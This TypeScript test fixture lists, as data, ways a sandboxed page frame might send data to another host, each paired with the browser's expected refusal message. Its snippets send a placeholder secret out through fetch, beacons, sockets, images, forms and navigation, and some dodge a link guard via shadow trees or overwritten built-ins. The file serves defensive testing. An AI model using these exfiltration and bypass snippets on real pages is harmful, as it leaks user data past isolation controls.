// The ways a Page could reach another host or the page that holds it, as data: what the Page
// holds to try each one, and the line the browser logs when it refuses. `view-exits.spec.ts`
// runs one test per entry. The entries hold no test code, so the list of console errors a test
// may cause (`test.ts`) names the same tests.

export interface PageExit {
  name: string;
  /** Markup in the body of the Page, given the origin of the other host. */
  html?(there: string): string;
  /** The Page's script, given the origin of the other host. */
  script?(there: string): string;
  /**
   * The browser's own line about the refusal. It shows that the Page tried. Where the browser
   * says nothing, the mark the Page's script sets as its first statement shows that it ran.
   */
  refusal?: RegExp;
  /** What the Page's script wrote on its body about how the try ended. */
  shows?: { attribute: string; value: string };
}

const directive = (name: string) =>
  new RegExp(` violates the following Content Security Policy directive: "${name}[ "]`, "u");

const FRAMING =
  /^Framing '[^']*' violates the following Content Security Policy directive: "frame-src 'none'"\./u;
const NO_FORMS =
  /^Blocked form submission to '[^']*' because the form's frame is sandboxed and the 'allow-forms' permission is not set\./u;
const NO_POPUPS =
  /^Blocked opening '[^']*' in a new window because the request was made in a sandboxed frame whose 'allow-popups' permission is not set\./u;
const NO_ANCESTOR_NAVIGATION =
  /^Unsafe attempt to initiate navigation for frame with (?:URL|origin) '[^']*' from frame with URL 'about:srcdoc'\. The frame attempting navigation /u;

const text = (value: string) => JSON.stringify(value);
const hit = (there: string, how: string) => `${there}/hit?${how}=1&rows=secret`;
/** A script that adds a `link` element of one relation. */
const hint = (rel: string) => (there: string) =>
  `const hint = document.createElement("link"); hint.rel = ${text(rel)}; hint.as = "script"; hint.href = ${text(hit(there, rel))}; document.head.appendChild(hint);`;
const hintMarkup = (rel: string) => (there: string) =>
  `<link rel="${rel}" as="script" href="${hit(there, rel)}">`;
/** A link outside the document: no listener of the Page's guard sees its click. */
const detachedLink = (attributes: string) => (there: string) =>
  `const link = document.createElement("a"); link.href = ${text(hit(there, "link"))}; ${attributes} link.click();`;

/** The Page moves its own frame, the frame that holds it, the top page, or opens a window. */
export const pageNavigationExits: readonly PageExit[] = [
  {
    name: "location.href",
    script: (there) => `location.href = ${text(hit(there, "href"))};`,
    refusal: FRAMING
  },
  {
    name: "location.assign",
    script: (there) => `location.assign(${text(hit(there, "assign"))});`,
    refusal: FRAMING
  },
  {
    name: "location.replace",
    script: (there) => `location.replace(${text(hit(there, "replace"))});`,
    refusal: FRAMING
  },
  {
    name: "a meta refresh in its document",
    html: (there) => `<meta http-equiv="refresh" content="0;url=${hit(there, "refresh")}">`,
    refusal: FRAMING
  },
  {
    name: "a meta refresh a script adds",
    script: (there) =>
      `const refresh = document.createElement("meta"); refresh.httpEquiv = "refresh"; refresh.content = "0;url=" + ${text(hit(there, "refresh"))}; document.head.appendChild(refresh);`,
    refusal: FRAMING
  },
  {
    name: "a link a script clicks outside its document",
    script: detachedLink(""),
    refusal: FRAMING
  },
  {
    name: "a download link a script clicks outside its document",
    script: detachedLink('link.download = "rows";'),
    refusal: FRAMING
  },
  {
    name: "a link to a new window a script clicks outside its document",
    script: detachedLink('link.target = "_blank";'),
    refusal: NO_POPUPS
  },
  {
    name: "a link to the top page a script clicks outside its document",
    script: detachedLink('link.target = "_top";'),
    refusal: NO_ANCESTOR_NAVIGATION
  },
  {
    name: "a link to its parent a script clicks outside its document",
    script: detachedLink('link.target = "_parent";'),
    refusal: NO_ANCESTOR_NAVIGATION
  },
  {
    name: "window.open",
    script: (there) =>
      `document.body.setAttribute("data-opened", String(window.open(${text(hit(there, "open"))})));`,
    refusal: NO_POPUPS,
    shows: { attribute: "data-opened", value: "null" }
  },
  {
    name: "top.location",
    script: (there) =>
      `try { top.location.href = ${text(hit(there, "top"))}; } catch (error) { document.body.setAttribute("data-threw", error.name); }`,
    refusal: NO_ANCESTOR_NAVIGATION
  },
  {
    name: "parent.location",
    script: (there) =>
      `try { parent.location.href = ${text(hit(there, "parent"))}; } catch (error) { document.body.setAttribute("data-threw", error.name); }`,
    refusal: NO_ANCESTOR_NAVIGATION
  },
  {
    name: "a form a script submits",
    html: (there) =>
      `<form id="form" action="${there}/hit" method="get"><input name="rows" value="secret"></form>`,
    script: () => `document.getElementById("form").submit();`,
    refusal: NO_FORMS
  },
  {
    name: "a form a script submits to a new window",
    html: (there) =>
      `<form id="form" action="${there}/hit" method="post" target="_blank"><input name="rows" value="secret"></form>`,
    script: () => `document.getElementById("form").submit();`,
    refusal: NO_FORMS
  }
];

/** The Page asks the other host for something, or sends it something. */
export const pageLoadExits: readonly PageExit[] = [
  {
    name: "fetch",
    script: (there) =>
      `fetch(${text(hit(there, "fetch"))}, { method: "POST", body: "rows" }).catch(() => undefined);`,
    refusal: directive("connect-src 'none'")
  },
  {
    name: "XMLHttpRequest",
    script: (there) =>
      `const request = new XMLHttpRequest(); request.open("GET", ${text(hit(there, "xhr"))}); request.send();`,
    refusal: directive("connect-src 'none'")
  },
  {
    name: "sendBeacon",
    script: (there) => `navigator.sendBeacon(${text(hit(there, "beacon"))}, "rows");`,
    refusal: directive("connect-src 'none'")
  },
  {
    name: "a WebSocket",
    script: (there) =>
      `try { new WebSocket(${text(hit(there.replace(/^http/u, "ws"), "socket"))}); } catch (error) {}`,
    refusal: directive("connect-src 'none'")
  },
  {
    name: "an EventSource",
    script: (there) => `new EventSource(${text(hit(there, "events"))});`,
    refusal: directive("connect-src 'none'")
  },
  {
    name: "an image a script loads",
    script: (there) => `new Image().src = ${text(hit(there, "image"))};`,
    refusal: directive("img-src 'self' data:")
  },
  {
    name: "an image in its markup",
    html: (there) => `<img alt="" src="${hit(there, "img")}">`,
    refusal: directive("img-src 'self' data:")
  },
  {
    name: "an image set in its markup",
    html: (there) => `<img alt="" srcset="${hit(there, "srcset")} 1x">`,
    refusal: directive("img-src 'self' data:")
  },
  {
    name: "an image in its style",
    html: (there) => `<style>#page-title { background: url(${hit(there, "css")}); }</style>`,
    refusal: directive("img-src 'self' data:")
  },
  {
    name: "an image in an inline style",
    html: (there) => `<p style="background: url('${hit(there, "style")}')">Styled</p>`,
    refusal: directive("img-src 'self' data:")
  },
  {
    name: "an imported stylesheet",
    html: (there) => `<style>@import url("${hit(there, "import")}");</style>`,
    refusal: directive("style-src 'self' 'unsafe-inline'")
  },
  {
    name: "a font",
    html: (there) =>
      `<style>@font-face { font-family: planted; src: url(${hit(there, "font")}); } #page-title { font-family: planted; }</style>`,
    refusal: directive("default-src 'none'")
  },
  {
    name: "an image in an embedded SVG",
    html: (there) =>
      `<svg width="20" height="20"><image width="20" height="20" href="${hit(there, "svgimage")}"/></svg>`,
    refusal: directive("img-src 'self' data:")
  },
  {
    name: "a reference in an embedded SVG",
    html: (there) => `<svg width="20" height="20"><use href="${hit(there, "use")}#shape"/></svg>`,
    refusal: /^Unsafe attempt to load URL \S+ from frame with URL about:srcdoc\./u
  },
  {
    name: "a fill in an embedded SVG",
    html: (there) =>
      `<svg width="20" height="20"><circle cx="5" cy="5" r="4" fill="url(${hit(there, "fill")}#paint)"/></svg>`
  },
  {
    name: "a video",
    html: (there) => `<video src="${hit(there, "video")}"></video>`,
    refusal: directive("default-src 'none'")
  },
  {
    name: "a script in its markup",
    html: (there) => `<script src="${hit(there, "script")}"></script>`,
    refusal: directive("script-src 'self'")
  },
  {
    name: "an imported script",
    script: (there) => `import(${text(hit(there, "import"))}).catch(() => undefined);`,
    refusal: directive("script-src 'self'")
  },
  {
    name: "an inline script",
    html: () => `<script>document.body.setAttribute("data-inline", "ran")</script>`,
    refusal:
      /^Executing inline script violates the following Content Security Policy directive 'script-src 'self''\./u
  },
  {
    name: "a worker of another host",
    script: (there) => `try { new Worker(${text(hit(there, "worker"))}); } catch (error) {}`
  },
  {
    name: "a worker of its own files",
    script: () =>
      `try { const worker = new Worker("./assets/worker.js"); worker.onmessage = () => document.body.setAttribute("data-worker", "answered"); worker.onerror = () => document.body.setAttribute("data-worker", "failed"); } catch (error) { document.body.setAttribute("data-worker", "threw " + error.name); }`,
    // A frame without an origin has no file of its own origin to start a worker from.
    shows: { attribute: "data-worker", value: "threw SecurityError" }
  },
  {
    name: "a base address",
    html: (there) => `<base href="${there}/"><img alt="" src="hit?base=1">`,
    refusal: directive("base-uri 'none'")
  },
  ...["prefetch", "preload", "modulepreload", "stylesheet", "icon"].flatMap((rel) => {
    const refusal =
      rel === "prefetch"
        ? directive("default-src 'none'")
        : rel === "stylesheet"
          ? directive("style-src 'self' 'unsafe-inline'")
          : rel === "icon"
            ? directive("img-src 'self' data:")
            : directive("script-src 'self'");
    return [
      { name: `a link of the relation ${rel} in its markup`, html: hintMarkup(rel), refusal },
      { name: `a link of the relation ${rel} a script adds`, script: hint(rel), refusal }
    ];
  }),
  // The browser may look a host up or connect to it for these without asking the policy, and
  // it logs nothing when it does not.
  ...["dns-prefetch", "preconnect"].flatMap((rel) => [
    { name: `a link of the relation ${rel} in its markup`, html: hintMarkup(rel) },
    { name: `a link of the relation ${rel} a script adds`, script: hint(rel) }
  ]),
  {
    name: "a frame, an object and an embed in its markup",
    html: (there) =>
      `<iframe src="${hit(there, "frame")}"></iframe><object data="${hit(there, "object")}"></object><embed src="${hit(there, "embed")}">`
  },
  {
    name: "a frame a script adds",
    script: (there) =>
      `const frame = document.createElement("iframe"); frame.src = ${text(hit(there, "frame"))}; document.body.appendChild(frame);`
  }
];

/** A link a person clicks, in the ways a Page could keep an address on it. */
/** The link whose script replaces the built-in methods of its document before it adds the link. */
export const REPLACED_BUILT_INS_LINK =
  "a link of a script that replaced the built-in methods first";

export interface PageLink {
  name: string;
  html?(address: string): string;
  script?(address: string): string;
  /** What the test clicks: the link itself, or the element that hides it. */
  target: string;
  /** The link is in a tree the test cannot read, so its address is not asserted. */
  hidden?: boolean;
  /** A way around the guard. It is clicked in the two ways that open a tab, not in every way. */
  bypass?: boolean;
  /** What the Page's script wrote on its body about how its try ended. */
  shows?: { attribute: string; value: string };
}

const linkStyle = "display:block;width:240px;height:40px";

export const pageLinks: readonly PageLink[] = [
  {
    name: "a link in its markup",
    html: (address) =>
      `<a id="go" style="${linkStyle}" ping="${address}" href="${address}">Open</a>`,
    target: "#go"
  },
  {
    name: "a download link in its markup",
    html: (address) => `<a id="go" style="${linkStyle}" download="rows" href="${address}">Open</a>`,
    target: "#go"
  },
  {
    name: "a link a script adds",
    script: (address) =>
      `const link = document.createElement("a"); link.id = "go"; link.style.cssText = ${text(linkStyle)}; link.textContent = "Open"; link.href = ${text(address)}; document.body.appendChild(link);`,
    target: "#go"
  },
  {
    name: "a link in an embedded SVG",
    html: (address) =>
      `<svg width="240" height="40"><a id="go" href="${address}" xlink:href="${address}"><rect width="240" height="40" fill="silver"/><text y="24">Open</text></a></svg>`,
    target: "#go"
  },
  {
    name: "a link that gets its address back when the pointer goes down",
    bypass: true,
    html: () => `<a id="go" style="${linkStyle}">Open</a>`,
    script: (address) =>
      `const link = document.getElementById("go"); for (const kind of ["pointerdown", "mousedown", "pointerup", "mouseup"]) { window.addEventListener(kind, () => { link.setAttribute("href", ${text(address)}); }, true); }`,
    target: "#go"
  },
  {
    name: "a link in a shadow tree",
    bypass: true,
    html: () => `<div id="host" style="${linkStyle}"></div>`,
    script: (address) =>
      `const root = document.getElementById("host").attachShadow({ mode: "open" }); root.innerHTML = '<a id="go" style="${linkStyle}" href="' + ${text(address)} + '">Open</a>';`,
    target: "#host #go"
  },
  {
    name: "a link in a closed shadow tree",
    bypass: true,
    html: () => `<div id="host" style="${linkStyle}"></div>`,
    script: (address) =>
      `const root = document.getElementById("host").attachShadow({ mode: "closed" }); const link = document.createElement("a"); link.style.cssText = ${text(linkStyle)}; link.textContent = "Open"; root.appendChild(link); link.href = ${text(address)}; for (const kind of ["pointerdown", "mousedown"]) { link.addEventListener(kind, () => { link.setAttribute("href", ${text(address)}); }, true); }`,
    target: "#host",
    hidden: true
  },
  {
    name: REPLACED_BUILT_INS_LINK,
    bypass: true,
    script: (address) =>
      [
        `const keep = function () {};`,
        `for (const [owner, names] of [[Element.prototype, ["removeAttribute", "removeAttributeNS", "remove", "hasAttribute", "querySelectorAll"]], [Event.prototype, ["preventDefault", "composedPath"]], [MutationObserver.prototype, ["observe", "disconnect"]], [EventTarget.prototype, ["addEventListener"]], [NodeList.prototype, ["item"]], [Reflect, ["apply"]], [Function.prototype, ["call", "apply"]]]) { for (const name of names) { try { owner[name] = keep; } catch (error) {} } }`,
        `for (const [owner, name] of [[Node.prototype, "nodeType"], [Element.prototype, "localName"], [NodeList.prototype, "length"], [MutationRecord.prototype, "addedNodes"], [MutationRecord.prototype, "type"], [MouseEvent.prototype, "ctrlKey"], [MouseEvent.prototype, "metaKey"], [MouseEvent.prototype, "button"]]) { try { Object.defineProperty(owner, name, { get: () => undefined }); } catch (error) {} }`,
        `const link = document.createElement("a"); link.id = "go"; link.style.cssText = ${text(linkStyle)}; link.textContent = "Open"; link.href = ${text(address)}; document.body.appendChild(link);`
      ].join("\n"),
    target: "#go"
  },
  {
    name: "a link of a script that tried to open its document again",
    bypass: true,
    script: (address) =>
      [
        `const tried = [];`,
        `for (const attempt of [() => document.open(), () => document.write("<a id='go' href='" + ${text(address)} + "'>Open</a>"), () => document.writeln("x"), () => document.body.setHTMLUnsafe("<div><template shadowrootmode='closed'><a href='" + ${text(address)} + "'>Open</a></template></div>"), () => Document.parseHTMLUnsafe("<p>x</p>")]) { try { attempt(); tried.push("done"); } catch (error) { tried.push(error.name); } }`,
        `document.body.setAttribute("data-tried", tried.join(","));`,
        `const link = document.createElement("a"); link.id = "go"; link.style.cssText = ${text(linkStyle)}; link.textContent = "Open"; link.href = ${text(address)}; document.body.appendChild(link);`
      ].join("\n"),
    target: "#go",
    shows: { attribute: "data-tried", value: "TypeError,TypeError,TypeError,TypeError,TypeError" }
  }
];

/** The titles of the tests `view-exits.spec.ts` makes of the lists above. */
export const pageExitTitle = (exit: PageExit) =>
  `a Page reaches no other host through ${exit.name}`;
export const pageLinkTitle = (link: Pick<PageLink, "name">, click: string) =>
  `${click} in a Page reaches no other host (${link.name})`;
/** The clicks that open a link in a tab of its own. A way around the guard is tried with these. */
export const tabOpeningClicks: readonly string[] = [
  "a Control or Meta click on a link",
  "a middle click on a link"
];
/** The other Page tests of `view-exits.spec.ts` that cause a browser log line on purpose. */
export const pageTestTitles = {
  instanceAddress: "a Page cannot move its frame to an address of the instance either",
  ownTab: "the address of a Page opened in a tab of its own is refused",
  otherSite: "another site cannot hold a Page in a frame",
  noFrames: "a Page holds no frame of its own, in its markup or written by its script",
  webRtc: "a Page sends no WebRTC packet the way a view can",
  noOrigin: "a Page reads no cookie, no storage and no session of the instance"
} as const;
